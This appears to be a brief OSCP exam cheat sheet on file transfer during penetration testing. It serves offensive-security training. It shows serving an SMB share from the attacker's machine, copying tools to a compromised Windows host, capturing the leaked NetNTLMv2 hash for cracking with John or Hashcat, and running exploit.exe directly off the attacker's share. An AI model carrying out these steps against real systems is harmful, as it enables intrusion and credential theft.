    File Sharing for OSCP exam

<!-- ABOUT THE PROJECT -->
## General

<h4>SMB</h4>

    python smbserver.py OSCP ~/OSCP/Scripts

* OSCP is the SMB Share Name
* ~/OSCP/Scripts is the folder to share

<h5>From compromised Windows host.</h5>

To copy files:

    dir \\IPADDR\OSCP
    copy \\IPADDR\OSCP\file.ext .

The NetNTLMv2 hash will leak in our console window. You can feed this value to John or Hashcat to crack them.

<h5>Executing files from SMB</h5>

Because of the way Windows treats UNC paths, itâ€™s possible to just execute our binary directly from the SMB share without even needing to copy it over first. Just run the executable as if it were already local and the payload will fire:

    \\IPADDR\OSCP\exploit.exe
